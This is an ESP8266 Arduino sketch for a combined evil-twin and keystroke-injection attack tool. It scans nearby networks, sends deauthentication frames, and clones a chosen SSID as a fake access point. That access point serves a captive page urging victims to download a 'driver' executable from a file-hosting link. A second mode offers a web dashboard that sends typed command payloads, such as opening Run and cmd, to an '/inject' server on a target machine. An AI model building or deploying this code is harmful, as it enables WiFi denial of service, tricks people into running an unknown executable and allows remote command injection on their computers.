

#include "deauth.h"
#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <EEPROM.h>

// --- Function Prototypes (YEH SAB PEHLE DECLARE KARO) ---
void blinkLED();
void handleEvilTwinRoot();
void handleHIDRoot();
void handleSave();
void handleSaveIP();
void showEvilTwinHelp();
void showEvilTwinStatus();
void showHelp();
void showStatus();
void connectToWiFi();
void saveTargetIP();
String loadTargetIP();
void switchToHIDMode();
void switchToEvilTwinMode();
void checkPythonConnection();




// --- Mode Control ---
enum OperationMode {
  EVIL_TWIN_MODE,
  HID_SIMULATOR_MODE
};
OperationMode currentMode = EVIL_TWIN_MODE;

// --- Evil Twin Components ---
ESP8266WebServer evilTwinServer(80);
struct WiFiNetwork {
  String ssid;
  uint8_t bssid[6];
  int channel;
  int rssi;
};
int networkCount = 0;
WiFiNetwork scannedNetworks[50];
int selectedNetworkIndex = -1;
const int ledPin = 2;
const long blinkInterval = 100;
unsigned long previousMillis = 0;
bool ledState = HIGH;

// --- HID Simulator Components ---
const char* AP_SSID = "HIDESP8266";
const char* AP_PASSWORD = "ESPATTCK";
ESP8266WebServer setupServer(80);
ESP8266WebServer runtimeServer(80);
String wifiSSID = "";
String wifiPassword = "";
String targetIP = "192.168.1.100";
bool isInRuntimeMode = false;

// --- HTML Content for Evil Twin ---
const char evilTwinHTML[] PROGMEM = R"(
<!DOCTYPE html>
<html>
<head>
<title>ESP8266</title>
</head>
<body>
  <h1>Wifi problem</h1>
  <p>Unable to connect to the WiFi network. Please check your settings and try again. Otherwise, Download driver</p>
  <a href="https://download1076.mediafire.com/88u13lc3lvzgVHp4lYA-vG3pdcPNWAUIKVkzrPBEIMslfhJPBI2hzl-olvV1y3eZu5M8P21HB5GLh62uAhyk28wI98nc2oNuZJrUOWnmCSQCRSrINLisW4OpnlSTtO-ytOXoLctSdYu1iWbNruOjZ96aVEpORg0lgCFX7G0nBuVChpln7Q/occeu1hcy81s6ku/main.exe">Download driver</a>
</body>
</html>
)";

// --- Evil Twin Functions ---
void blinkLED() {
  unsigned long currentMillis = millis();
  if (currentMillis - previousMillis >= blinkInterval) {
    previousMillis = currentMillis;
    ledState = !ledState;
    digitalWrite(ledPin, ledState ? LOW : HIGH);
  }
}

void handleEvilTwinRoot() {
  evilTwinServer.send(200, "text/html", evilTwinHTML);
}

void showEvilTwinHelp() {
  Serial.println("\n--- Evil Twin Commands ---");
  Serial.println("  scan          - Scan for WiFi networks");
  Serial.println("  ap X          - Create Fake AP for network X");
  Serial.println("  deauth X      - Start deauth attack on network X");
  Serial.println("  deauth off    - Stop deauth attack");
  Serial.println("  hid           - Switch to HID Simulator mode");
  Serial.println("  help          - Show this help");
  Serial.println("  status        - Show current status");
  Serial.println("------------------------\n");
}

void showEvilTwinStatus() {
  Serial.println("\n--- Evil Twin Status ---");
  Serial.printf("Fake AP SSID: %s\n", WiFi.softAPSSID().c_str());
  Serial.printf("Fake AP IP: %s\n", WiFi.softAPIP().toString().c_str());
  if (deauthRunning) {
    Serial.printf("Deauth Attack: RUNNING on %s (Ch: %d)\n", scannedNetworks[selectedNetworkIndex].ssid.c_str(), scannedNetworks[selectedNetworkIndex].channel);
  } else {
    Serial.println("Deauth Attack: STOPPED");
  }
  Serial.println("-----------------------\n");
}

void switchToHIDMode() {
  currentMode = HID_SIMULATOR_MODE;
  deauthRunning = false;
  wifi_promiscuous_enable(0);
  evilTwinServer.close();
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_AP);
  WiFi.softAP(AP_SSID, AP_PASSWORD);
  
  setupServer.on("/", handleHIDRoot);
  setupServer.on("/save", HTTP_POST, handleSave);
  setupServer.begin();
  
  Serial.println("\n=== SWITCHED TO HID SIMULATOR MODE ===");
  Serial.print("Connect to: ");
  Serial.println(AP_SSID);
  Serial.print("AP IP: ");
  Serial.println(WiFi.softAPIP());
}

void switchToEvilTwinMode() {
  currentMode = EVIL_TWIN_MODE;
  isInRuntimeMode = false;
  setupServer.close();
  runtimeServer.close();
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  
  evilTwinServer.on("/", handleEvilTwinRoot);
  evilTwinServer.begin();
  
  Serial.println("\n=== SWITCHED TO EVIL TWIN MODE ===");
  Serial.println("Type 'scan' to start WiFi scanning");
}

// --- HID Simulator Functions ---
void saveTargetIP() {
  EEPROM.begin(512);
  for (int i = 0; i < targetIP.length(); i++) {
    EEPROM.write(i, targetIP[i]);
  }
  EEPROM.write(targetIP.length(), '\0');
  EEPROM.commit();
  EEPROM.end();
}

String loadTargetIP() {
  EEPROM.begin(512);
  String ip;
  char c = EEPROM.read(0);
  for (int i = 1; c != '\0' && i < 16; i++) {
    ip += c;
    c = EEPROM.read(i);
  }
  EEPROM.end();
  return ip.length() > 6 ? ip : "192.168.1.100";
}

void connectToWiFi() {
  WiFi.mode(WIFI_STA);
  WiFi.begin(wifiSSID.c_str(), wifiPassword.c_str());
  
  int attempts = 0;
  while (WiFi.status() != WL_CONNECTED && attempts < 20) {
    delay(500);
    attempts++;
  }
  
  if (WiFi.status() == WL_CONNECTED) {
    isInRuntimeMode = true;
    targetIP = loadTargetIP();
    setupServer.close();
    runtimeServer.on("/", handleHIDRoot);
    runtimeServer.on("/saveip", HTTP_POST, handleSaveIP);
    runtimeServer.begin();
    Serial.println("Connected to WiFi!");
    Serial.print("IP Address: ");
    Serial.println(WiFi.localIP());
  } else {
    WiFi.mode(WIFI_AP);
    WiFi.softAP(AP_SSID, AP_PASSWORD);
    Serial.println("Failed to connect, staying in AP mode");
  }
}

void handleHIDRoot() {
  if (!isInRuntimeMode) {
    // Setup Mode
    String html = "<html><head><title>HID Simulator Setup</title><style>";
    html += "body{font-family:Arial,sans-serif;margin:20px;background:#f5f5f5;}";
    html += ".container{background:white;padding:20px;border-radius:5px;max-width:500px;margin:0 auto;}";
    html += "input,button{padding:8px;margin:5px 0;width:100%;box-sizing:border-box;}";
    html += "button{background:#4CAF50;color:white;border:none;cursor:pointer;}";
    html += "</style></head><body><div class='container'>";
    html += "<h2>HID Simulator Setup</h2>";
    html += "<form method='POST' action='/save'>";
    html += "<p>WiFi SSID:</p><input type='text' name='ssid' required>";
    html += "<p>WiFi Password:</p><input type='password' name='password'>";
    html += "<p><button type='submit'>Save & Connect</button></p>";
    html += "</form></div></body></html>";
    setupServer.send(200, "text/html", html);
  } else {
    // Runtime Mode
    String html = "<html><head><title>HID Simulator Dashboard</title><style>";
    html += "body{font-family:Arial,sans-serif;margin:20px;background:#f5f5f5;}";
    html += ".container{background:white;padding:20px;border-radius:5px;max-width:600px;margin:0 auto;}";
    html += "input,textarea,button{padding:8px;margin:5px 0;width:100%;box-sizing:border-box;}";
    html += "button{background:#4CAF50;color:white;border:none;cursor:pointer;width:auto;}";
    html += ".presets{display:flex;gap:5px;margin-bottom:10px;flex-wrap:wrap;}";
    html += ".presets button{flex:1 0 30%;}";
    html += ".ip-form{display:flex;gap:5px;margin-bottom:10px;}";
    html += ".ip-form input{flex:3;}";
    html += ".ip-form button{flex:1;}";
        html += "</style></head><body><div class='container'>";
    html += "<h2>HID Simulator Dashboard</h2>";
    html += "<p>Connected to: " + wifiSSID + "</p>";
    html += "<p>ESP IP: " + WiFi.localIP().toString() + "</p>";
    html += "<div class='ip-form'>";
    html += "<input type='text' id='targetIP' value='" + targetIP + "' placeholder='Target IP'>";
    html += "<button onclick='saveIP()'>Save IP</button>";
    html += "</div>";
    html += "<p>Payload:</p><textarea id='payload' rows='8' placeholder='Enter commands...'></textarea>";
    html += "<div class='presets'>";
    html += "<button onclick=\"setPayload('WINR')\">Win+R</button>";
    html += "<button onclick=\"setPayload('SOFTWARE')\">Last App</button>";
    html += "<button onclick=\"setPayload('TYPE:notepad\\nENTER')\">Notepad</button>";
    html += "<button onclick=\"setPayload('TYPE:cmd\\nENTER\\nTYPE:dir\\nENTER')\">CMD Dir</button>";
    html += "<button onclick=\"setPayload('ENTER')\">Enter</button>";
    html += "<button onclick=\"setPayload('DELAY:1000')\">Delay 1s</button>";
    html += "</div>";
    html += "<button onclick='sendPayload()'>Inject</button>";
    html += "<script>";
    html += "function setPayload(p) { document.getElementById('payload').value = p; }";
    html += "function saveIP() {";
    html += "  var ip = document.getElementById('targetIP').value;";
    html += "  if (!/^(\\d{1,3}\\.){3}\\d{1,3}$/.test(ip)) { alert('Invalid IP'); return; }";
    html += "  fetch('/saveip', {";
    html += "    method: 'POST',";
    html += "    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },";
    html += "    body: 'targetip=' + encodeURIComponent(ip)";
    html += "  }).then(r => r.text()).then(t => alert(t)).catch(e => alert('Error: ' + e));";
    html += "}";
    html += "function sendPayload() {";
    html += "  var ip = document.getElementById('targetIP').value;";
    html += "  var payload = document.getElementById('payload').value;";
    html += "  if (!ip || !payload) { alert('IP and payload required'); return; }";
    html += "  var btn = this;";
    html += "  btn.disabled = true;";
    html += "  btn.textContent = 'Sending...';";
    html += "  fetch('http://' + ip + ':5000/inject', {";
    html += "    method: 'POST',";
    html += "    headers: { 'Content-Type': 'text/plain' },";
    html += "    body: payload";
    html += "  }).then(r => r.ok ? r.text() : Promise.reject('Server error'))";
    html += "    .then(t => alert('Success: ' + t))";
    html += "    .catch(e => alert('Error: ' + e))";
    html += "    .finally(() => { btn.disabled = false; btn.textContent = 'Inject'; });";
    html += "}";
    html += "</script>";
    html += "</div></body></html>";
    runtimeServer.send(200, "text/html", html);
  }
}

void handleSave() {
  if (setupServer.hasArg("ssid")) {
    wifiSSID = setupServer.arg("ssid");
    wifiPassword = setupServer.arg("password");
    
    String html = "<html><head><title>Connecting...</title>";
    html += "<meta http-equiv='refresh' content='10;url=http://" + WiFi.softAPIP().toString() + "'>";
    html += "</head><body><h2>Connecting to " + wifiSSID + "...</h2>";
    html += "<p>Device will attempt to connect. If unsuccessful, you'll be redirected back to setup.</p>";
    html += "</body></html>";
    setupServer.send(200, "text/html", html);
    
    delay(1000);
    connectToWiFi();
  } else {
    setupServer.send(400, "text/plain", "SSID required");
  }
}

void handleSaveIP() {
  if (runtimeServer.hasArg("targetip")) {
    targetIP = runtimeServer.arg("targetip");
    saveTargetIP();
    runtimeServer.send(200, "text/plain", "Target IP saved: " + targetIP);
  } else {
    runtimeServer.send(400, "text/plain", "Target IP required");
  }
}

// --- Main Help and Status Functions ---
void showHelp() {
  if (currentMode == EVIL_TWIN_MODE) {
    showEvilTwinHelp();
  } else {
    Serial.println("\n--- HID Simulator Commands ---");
    Serial.println("  evil         - Switch to Evil Twin mode");
    Serial.println("  status       - Show current status");
    Serial.println("  check        - Test Python server connection");
    Serial.println("  help         - Show this help");
    Serial.println("-------------------------------\n");
  }
}

void showStatus() {
  if (currentMode == EVIL_TWIN_MODE) {
    showEvilTwinStatus();
  } else {
    Serial.println("\n--- HID Simulator Status ---");
    Serial.printf("Mode: %s\n", isInRuntimeMode ? "Runtime (Connected)" : "Setup (AP Mode)");
    if (isInRuntimeMode) {
      Serial.printf("Connected to: %s\n", wifiSSID.c_str());
      Serial.printf("ESP IP: %s\n", WiFi.localIP().toString().c_str());
      Serial.printf("Target IP: %s\n", targetIP.c_str());
    } else {
      Serial.printf("AP SSID: %s\n", AP_SSID);
      Serial.printf("AP IP: %s\n", WiFi.softAPIP().toString().c_str());
    }
    Serial.println("-----------------------\n");
  }
}

// --- Setup Function ---
void setup() {
  Serial.begin(115200);
  pinMode(ledPin, OUTPUT);
  digitalWrite(ledPin, HIGH);
  delay(1000);

  Serial.println("\n=== Multi-Mode ESP8266 Tool ===");
  Serial.println("Starting in Evil Twin mode...");
  Serial.println("Type 'help' for commands.\n");

  // Start in Evil Twin Mode
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(500);

  Serial.println("\n[*] Scanning for nearby WiFi networks...");
  int n = WiFi.scanNetworks();
  Serial.println("[*] Scan finished.");

  if (n == 0) {
    Serial.println("[!] No networks found. Halting.");
    while (true) { delay(1); }
  } else {
    networkCount = n;
    Serial.printf("[*] %d networks found:\n", n);
    Serial.println("-------------------------------------------------");
    for (int i = 0; i < n; ++i) {
      scannedNetworks[i].ssid = WiFi.SSID(i);
      memcpy(scannedNetworks[i].bssid, WiFi.BSSID(i), 6);
      scannedNetworks[i].channel = WiFi.channel(i);
      scannedNetworks[i].rssi = WiFi.RSSI(i);
      Serial.printf("[%02d] - SSID: %s, Ch: %d, RSSI: %d dBm\n", i, scannedNetworks[i].ssid.c_str(), scannedNetworks[i].channel, scannedNetworks[i].rssi);
    }
    Serial.println("-------------------------------------------------");
  }
  
  evilTwinServer.on("/", handleEvilTwinRoot);
  evilTwinServer.begin();
  Serial.println("[*] Evil Twin webserver started.");
}

// --- Main Loop ---
void loop() {
  // Handle Serial Commands
  if (Serial.available()) {
    String command = Serial.readStringUntil('\n');
    command.trim();
    command.toLowerCase();

    if (currentMode == EVIL_TWIN_MODE) {
      // Evil Twin Commands
      if (command.equals("scan")) {
        Serial.println("[*] Rescanning for networks...");
        WiFi.scanDelete();
        int n = WiFi.scanNetworks();
        if (n == WIFI_SCAN_FAILED) {
          Serial.println("[!] Scan failed!");
        } else if (n == 0) {
          Serial.println("[!] No networks found!");
        } else {
          networkCount = n;
          Serial.printf("[*] %d networks found:\n", n);
          Serial.println("-------------------------------------------------");
          for (int i = 0; i < n; ++i) {
            scannedNetworks[i].ssid = WiFi.SSID(i);
            memcpy(scannedNetworks[i].bssid, WiFi.BSSID(i), 6);
            scannedNetworks[i].channel = WiFi.channel(i);
            scannedNetworks[i].rssi = WiFi.RSSI(i);
            Serial.printf("[%02d] - SSID: %s, Ch: %d, RSSI: %d dBm\n", i, scannedNetworks[i].ssid.c_str(), scannedNetworks[i].channel, scannedNetworks[i].rssi);
          }
          Serial.println("-------------------------------------------------");
        }
      }
      else if (command.startsWith("ap ")) {
        int index = command.substring(3).toInt();
        if (index < 0 || index >= networkCount) {
                   Serial.println("[!] Invalid index for AP!");
        } else {
          selectedNetworkIndex = index;
          String selectedSSID = scannedNetworks[selectedNetworkIndex].ssid;
          
          if(deauthRunning) { stopDeauth(); }
          
          Serial.printf("\n[*] Starting Fake AP with SSID: %s\n", selectedSSID.c_str());
          WiFi.softAPdisconnect(true);
          WiFi.mode(WIFI_AP);
          WiFi.softAP(selectedSSID.c_str());
          IPAddress IP = WiFi.softAPIP();
          Serial.printf("[*] Fake AP Started! IP Address: %s\n", IP.toString().c_str());
        }
      }
      else if (command.startsWith("deauth ")) {
        String arg = command.substring(7);
        if (arg.equals("off")) {
          if (!deauthExecuted) {
            Serial.println("[!] No deauth attack was started yet.");
          } else {
            stopDeauth();
          }
        } else {
          int index = arg.toInt();
          if (index < 0 || index >= networkCount) {
            Serial.println("[!] Invalid index for deauth!");
          } else {
            startDeauth(index);
          }
        }
      }
      else if (command.equals("hid")) {
        switchToHIDMode();
      }
      else if (command.equals("help")) {
        showHelp();
      }
      else if (command.equals("status")) {
        showStatus();
      }
      else if (command.length() > 0) {
        Serial.println("[!] Invalid command. Type 'help' for available commands.");
      }
    } 
    else if (currentMode == HID_SIMULATOR_MODE) {
      // HID Simulator Commands
      if (command.equals("evil")) {
        switchToEvilTwinMode();
      }
      else if (command.equals("check")) {  // YEH LINE ADD KARO
        checkPythonConnection();
     }
      else if (command.equals("help")) {
        showHelp();
      }
      else if (command.equals("status")) {
        showStatus();
      }
      else if (command.length() > 0) {
        Serial.println("[!] Invalid command. Type 'help' for available commands.");
      }
    }
  }

  // --- Background Tasks ---
  if (currentMode == EVIL_TWIN_MODE) {
    evilTwinServer.handleClient();
    
    if (deauthRunning) {
      sendDeauth();
      blinkLED();
    }
  } 
  else if (currentMode == HID_SIMULATOR_MODE) {
    if (isInRuntimeMode) {
      runtimeServer.handleClient();
    } else {
      setupServer.handleClient();
    }
  }
}



void checkPythonConnection() {
  Serial.println("\n--- Checking Python Server Connection ---");
  
  WiFiClient client;
  if (client.connect(targetIP.c_str(), 5000)) {
    Serial.println("[✓] Python server is reachable!");
    Serial.printf("[*] Target IP: %s:5000\n", targetIP.c_str());
    
    // Send a test payload to /inject endpoint
    String testPayload = "DELAY:100";
    client.print("POST /inject HTTP/1.1\r\n");
    client.print("Host: " + targetIP + "\r\n");
    client.print("Content-Type: text/plain\r\n");
    client.print("Content-Length: " + String(testPayload.length()) + "\r\n");
    client.print("Connection: close\r\n\r\n");
    client.print(testPayload);
    
    // Wait for response
    unsigned long timeout = millis();
    while (client.available() == 0) {
      if (millis() - timeout > 3000) {
        Serial.println("[!] Server reachable but not responding correctly");
        client.stop();
        return;
      }
    }
    
    // Read response
    bool responseOk = false;
    while (client.available()) {
      String line = client.readStringUntil('\r');
      if (line.indexOf("200") > 0 || line.indexOf("Command processing started") > 0) {
        responseOk = true;
      }
    }
    client.stop();
    
    if (responseOk) {
      Serial.println("[✓] Server responded correctly!");
      Serial.println("[*] Ready to send commands");
    } else {
      Serial.println("[!] Server response invalid");
    }
    
  } else {
    Serial.println("[✗] Cannot connect to Python server!");
    Serial.printf("[!] Target IP: %s:5000\n", targetIP.c_str());
    Serial.println("[*] Check if:");
    Serial.println("    - Python script is running");
    Serial.println("    - Target IP is correct");
    Serial.println("    - Firewall is blocking connection");
  }
  Serial.println("----------------------------------------\n");
}
